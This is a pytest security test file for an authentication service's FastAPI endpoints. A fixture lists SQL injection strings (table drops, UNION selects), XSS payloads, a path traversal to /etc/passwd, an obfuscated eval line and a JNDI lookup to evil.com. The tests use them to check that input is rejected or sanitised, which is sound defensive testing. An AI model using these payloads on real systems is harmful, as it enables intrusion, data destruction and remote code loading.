"""
Security Tests for Auth Service - Critical Security Validation
Tests SQL injection, XSS, CSRF protection, and audit logging
"""
import asyncio
import json
from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from auth_service.auth_core.models.auth_models import (
    AuthProvider,
    LoginRequest,
    ServiceTokenRequest,
)
from auth_service.auth_core.routes.auth_routes import router as auth_router
from auth_service.auth_core.services.auth_service import AuthService


@pytest.fixture
def app():
    """Create test FastAPI app"""
    app = FastAPI()
    app.include_router(auth_router)
    return app


@pytest.fixture
def client(app):
    """Create test client"""
    return TestClient(app)


@pytest.fixture
def mock_auth_service():
    """Mock auth service for testing"""
    with patch('auth_core.routes.auth_routes.auth_service') as mock:
        yield mock


@pytest.fixture
def security_test_payloads():
    """Common attack payloads for security testing"""
    return {
        'sql_injection': [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'; DELETE FROM auth_users; --",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES('hacker','pass'); --",
            "1' OR 1=1 UNION SELECT @@version --"
        ],
        'xss_payloads': [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "data:text/html,<script>alert('XSS')</script>"
        ],
        'malicious_headers': [
            "<script>document.cookie='admin=true'</script>",
            "'; eval(atob('YWxlcnQoJ1hTUycpOw=='));//",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/exploit}"
        ]
    }


class TestSQLInjectionPrevention:
    """Test SQL injection prevention across all endpoints"""
    
    @pytest.mark.asyncio
    @pytest.mark.asyncio
    async def test_login_sql_injection_prevention(self, client, 
                                                  security_test_payloads,
                                                  mock_auth_service):
        """Test SQL injection attempts in login endpoint"""
        mock_auth_service.login = AsyncMock()
        
        for payload in security_test_payloads['sql_injection']:
            # Test email field
            login_data = {
                "email": payload,
                "password": "testpass",
                "provider": "local"
            }
            
            response = client.post("/auth/login", json=login_data)
            
            # Should reject malicious input
            assert response.status_code in [400, 422], f"Failed to reject SQL injection: {payload}"
            
            # Test password field
            login_data = {
                "email": "test@example.com", 
                "password": payload,
                "provider": "local"
            }
            
            response = client.post("/auth/login", json=login_data)
            
            # Auth service should not be called with malicious data
            if mock_auth_service.login.called:
                call_args = mock_auth_service.login.call_args[0][0]
                # Verify input was sanitized or rejected
                assert payload not in str(call_args.email)
                assert payload not in str(call_args.password)

    @pytest.mark.asyncio
    async def test_token_validation_sql_injection(self, client,
                                                 security_test_payloads,
                                                 mock_auth_service):
        """Test SQL injection in token validation"""
        mock_auth_service.validate_token = AsyncMock()
        
        for payload in security_test_payloads['sql_injection']:
            token_data = {"token": payload}
            
            response = client.post("/auth/validate", json=token_data)
            
            # Should handle malicious tokens gracefully
            assert response.status_code in [400, 401, 422]
            
            # Verify no SQL injection reached database layer
            if mock_auth_service.validate_token.called:
                call_args = mock_auth_service.validate_token.call_args[0][0]
                assert "DROP TABLE" not in call_args
                assert "DELETE FROM" not in call_args

    @pytest.mark.asyncio
    async def test_service_token_sql_injection(self, client,
                                              security_test_payloads, 
                                              mock_auth_service):
        """Test SQL injection in service token endpoint"""
        mock_auth_service.create_service_token = AsyncMock()
        
        for payload in security_test_payloads['sql_injection']:
            service_data = {
                "service_id": payload,
                "service_secret": "valid_secret"
            }
            
            response = client.post("/auth/service-token", json=service_data)
            
            # Should reject malicious service IDs
            assert response.status_code in [400, 401, 422]


class TestXSSPrevention:
    """Test XSS prevention in user data handling"""
    
    @pytest.mark.asyncio
    async def test_login_xss_prevention(self, client,
                                       security_test_payloads,
                                       mock_auth_service):
        """Test XSS prevention in login inputs"""
        # Mock successful login to test response handling
        mock_auth_service.login = AsyncMock(return_value=MagicMock(
            access_token="safe_token",
            refresh_token="safe_refresh",
            user={"id": "123", "email": "clean@example.com", "name": "Safe Name"}
        ))
        
        for payload in security_test_payloads['xss_payloads']:
            login_data = {
                "email": f"test{payload}@example.com",
                "password": "testpass",
                "provider": "local"
            }
            
            response = client.post("/auth/login", json=login_data)
            
            if response.status_code == 200:
                response_data = response.json()
                # Verify XSS payload not reflected in response
                assert "<script>" not in json.dumps(response_data)
                assert "javascript:" not in json.dumps(response_data) 
                assert "onerror=" not in json.dumps(response_data)

    @pytest.mark.asyncio
    async def test_user_agent_xss_prevention(self, client,
                                            security_test_payloads,
                                            mock_auth_service):
        """Test XSS prevention in User-Agent header"""
        mock_auth_service.login = AsyncMock()
        
        for payload in security_test_payloads['xss_payloads']:
            headers = {
                "User-Agent": payload,
                "Content-Type": "application/json"
            }
            
            login_data = {
                "email": "test@example.com",
                "password": "testpass", 
                "provider": "local"
            }
            
            response = client.post("/auth/login", json=login_data, headers=headers)
            
            # Should not crash or reflect XSS
            assert response.status_code != 500
            
            if mock_auth_service.login.called:
                # Check client_info was sanitized
                call_args = mock_auth_service.login.call_args
                client_info = call_args[0][1] if len(call_args[0]) > 1 else call_args[1].get('client_info')
                if client_info and 'user_agent' in client_info:
                    user_agent = client_info['user_agent']
                    # Verify dangerous content was sanitized
                    assert "<script>" not in user_agent
                    assert "javascript:" not in user_agent

    @pytest.mark.asyncio
    async def test_oauth_callback_xss_prevention(self, client,
                                                security_test_payloads):
        """Test XSS prevention in OAuth callback parameters"""
        for payload in security_test_payloads['xss_payloads']:
            # Test malicious state parameter
            response = client.get(f"/auth/callback?code=valid_code&state={payload}")
            
            # Should handle malicious state safely
            if response.status_code in [200, 302]:
                # Check response doesn't reflect XSS
                response_text = response.text if hasattr(response, 'text') else str(response.content)
                assert "<script>" not in response_text
                assert "javascript:" not in response_text


class TestCSRFProtection:
    """Test CSRF protection and security headers"""
    
    @pytest.mark.asyncio
    async def test_security_headers_present(self, client):
        """Test security headers are set properly"""
        response = client.get("/auth/health")
        
        # Check for security headers
        headers = response.headers
        
        # Content-Type should be secure
        assert "application/json" in headers.get("content-type", "")
        
        # Should not have sensitive info in headers
        assert "password" not in str(headers).lower()
        assert "secret" not in str(headers).lower()

    @pytest.mark.asyncio
    async def test_csrf_token_validation(self, client, mock_auth_service):
        """Test CSRF protection for state-changing operations"""
        mock_auth_service.login = AsyncMock()
        
        # Test without proper referrer (potential CSRF)
        login_data = {
            "email": "test@example.com",
            "password": "testpass",
            "provider": "local"
        }
        
        suspicious_headers = {
            "Origin": "https://evil.com",
            "Referer": "https://malicious-site.com",
            "Content-Type": "application/json"
        }
        
        response = client.post("/auth/login", json=login_data, headers=suspicious_headers)
        
        # Should still process request (REST API, not browser form)
        # but should log the suspicious activity
        assert response.status_code in [200, 400, 401, 422]

    @pytest.mark.asyncio
    async def test_method_override_prevention(self, client):
        """Test prevention of HTTP method override attacks"""
        # Try to override GET to POST using headers
        override_headers = {
            "X-HTTP-Method-Override": "POST",
            "X-Method-Override": "DELETE"
        }
        
        response = client.get("/auth/health", headers=override_headers)
        
        # Should still be treated as GET
        assert response.status_code == 200


class TestInputValidation:
    """Test comprehensive input validation"""
    
    @pytest.mark.asyncio
    async def test_email_validation(self, client):
        """Test email format validation"""
        invalid_emails = [
            "invalid-email",
            "@domain.com", 
            "user@",
            "user space@domain.com",
            "user@domain",
            "very-long-email" + "x" * 100 + "@domain.com"
        ]
        
        for email in invalid_emails:
            login_data = {
                "email": email,
                "password": "testpass",
                "provider": "local"
            }
            
            response = client.post("/auth/login", json=login_data)
            
            # Should reject invalid email formats
            assert response.status_code == 422

    @pytest.mark.asyncio
    async def test_password_length_limits(self, client, mock_auth_service):
        """Test password length validation"""
        mock_auth_service.login = AsyncMock()
        
        # Test extremely long password
        long_password = "x" * 10000
        
        login_data = {
            "email": "test@example.com",
            "password": long_password,
            "provider": "local"
        }
        
        response = client.post("/auth/login", json=login_data)
        
        # Should handle gracefully (limit or reject)
        assert response.status_code != 500

    @pytest.mark.asyncio
    async def test_json_payload_size_limit(self, client):
        """Test protection against large payload attacks"""
        # Create oversized payload
        huge_data = {
            "email": "test@example.com",
            "password": "testpass",
            "provider": "local",
            "malicious_data": "x" * 100000  # 100KB of data
        }
        
        response = client.post("/auth/login", json=huge_data)
        
        # Should handle oversized payloads gracefully
        assert response.status_code in [400, 413, 422]


class TestSecurityLogging:
    """Test security event logging and audit trail"""
    
    @pytest.mark.asyncio
    async def test_failed_login_logging(self, client, mock_auth_service):
        """Test failed login attempts are logged"""
        mock_auth_service.login = AsyncMock(side_effect=Exception("Invalid credentials"))
        
        login_data = {
            "email": "test@example.com",
            "password": "wrongpass",
            "provider": "local" 
        }
        
        with patch('auth_core.routes.auth_routes.logger') as mock_logger:
            response = client.post("/auth/login", json=login_data)
            
            # Should log the failed attempt
            mock_logger.error.assert_called()
            
            # Verify sensitive data not logged
            logged_calls = str(mock_logger.error.call_args_list)
            assert "wrongpass" not in logged_calls

    @pytest.mark.asyncio
    async def test_sql_injection_attempt_logging(self, client, 
                                                mock_auth_service,
                                                security_test_payloads):
        """Test SQL injection attempts are logged"""
        mock_auth_service.login = AsyncMock()
        
        malicious_email = security_test_payloads['sql_injection'][0]
        login_data = {
            "email": malicious_email,
            "password": "testpass",
            "provider": "local"
        }
        
        with patch('auth_core.routes.auth_routes.logger') as mock_logger:
            response = client.post("/auth/login", json=login_data)
            
            # Should log suspicious activity
            if response.status_code in [400, 422]:
                # Validation error should be logged
                assert mock_logger.error.called or mock_logger.warning.called

    @pytest.mark.asyncio
    async def test_audit_trail_completeness(self, client, mock_auth_service):
        """Test comprehensive audit logging"""
        # Mock successful operations to test audit trail
        mock_auth_service.login = AsyncMock(return_value=MagicMock(
            access_token="token123",
            refresh_token="refresh123", 
            user={"id": "user123", "email": "test@example.com"}
        ))
        
        login_data = {
            "email": "test@example.com",
            "password": "testpass",
            "provider": "local"
        }
        
        # Simulate request with client info
        headers = {
            "User-Agent": "TestClient/1.0",
            "X-Forwarded-For": "192.168.1.100"
        }
        
        response = client.post("/auth/login", json=login_data, headers=headers)
        
        if response.status_code == 200:
            # Verify audit logging was called
            assert mock_auth_service.login.called
            
            # Check client info was captured
            call_args = mock_auth_service.login.call_args
            client_info = call_args[0][1] if len(call_args[0]) > 1 else {}
            
            # Should have captured client information
            assert isinstance(client_info, dict)


class TestTokenSecurity:
    """Test JWT token security measures"""
    
    @pytest.mark.asyncio
    async def test_token_format_validation(self, client, mock_auth_service):
        """Test JWT token format validation"""
        invalid_tokens = [
            "invalid.token",
            "not-a-jwt-token",
            "header.payload",  # Missing signature
            "header.payload.signature.extra",  # Too many parts
            "",  # Empty token
            "Bearer malformed-token"  # Wrong format
        ]
        
        mock_auth_service.validate_token = AsyncMock(return_value=MagicMock(valid=False))
        
        for token in invalid_tokens:
            response = client.post("/auth/validate", json={"token": token})
            
            # Should reject invalid token formats
            assert response.status_code in [400, 401, 422]

    @pytest.mark.asyncio
    async def test_token_injection_prevention(self, client,
                                             security_test_payloads,
                                             mock_auth_service):
        """Test prevention of token injection attacks"""
        mock_auth_service.validate_token = AsyncMock()
        
        for payload in security_test_payloads['sql_injection']:
            # Try to inject SQL through token
            malicious_token = f"eyJhbGciOiJIUzI1NiJ9.{payload}.signature"
            
            response = client.post("/auth/validate", json={"token": malicious_token})
            
            # Should handle malicious tokens safely
            assert response.status_code in [400, 401, 422]


class TestRateLimiting:
    """Test rate limiting and abuse prevention"""
    
    @pytest.mark.asyncio
    async def test_login_rate_limiting(self, client, mock_auth_service):
        """Test rate limiting on login attempts"""
        mock_auth_service.login = AsyncMock(side_effect=Exception("Invalid credentials"))
        
        login_data = {
            "email": "test@example.com",
            "password": "wrongpass",
            "provider": "local"
        }
        
        responses = []
        
        # Make multiple rapid requests
        for i in range(20):
            response = client.post("/auth/login", json=login_data)
            responses.append(response.status_code)
        
        # Should eventually rate limit (429) or maintain rejection (401)
        # At minimum, should not crash the service
        assert all(code != 500 for code in responses)

    @pytest.mark.asyncio
    async def test_token_validation_rate_limiting(self, client, mock_auth_service):
        """Test rate limiting on token validation"""
        mock_auth_service.validate_token = AsyncMock(return_value=MagicMock(valid=False))
        
        # Rapid token validation requests
        for i in range(50):
            response = client.post("/auth/validate", json={"token": f"token{i}"})
            
            # Should handle gracefully without crashing
            assert response.status_code != 500


@pytest.mark.asyncio
async def test_comprehensive_security_scenario(client, mock_auth_service,
                                              security_test_payloads):
    """Test comprehensive attack scenario"""
    # Simulate sophisticated attack combining multiple vectors
    mock_auth_service.login = AsyncMock()
    
    # Multi-vector attack payload
    attack_data = {
        "email": security_test_payloads['sql_injection'][0],  # SQL injection
        "password": security_test_payloads['xss_payloads'][0],  # XSS
        "provider": "local"
    }
    
    malicious_headers = {
        "User-Agent": security_test_payloads['malicious_headers'][0],
        "X-Forwarded-For": "1.1.1.1, " + security_test_payloads['sql_injection'][1],
        "Origin": "https://evil.com",
        "Referer": "javascript:alert('attack')"
    }
    
    response = client.post("/auth/login", json=attack_data, headers=malicious_headers)
    
    # Should handle comprehensive attack gracefully
    assert response.status_code in [400, 401, 422]
    
    # Should not crash the service
    health_response = client.get("/auth/health")
    assert health_response.status_code == 200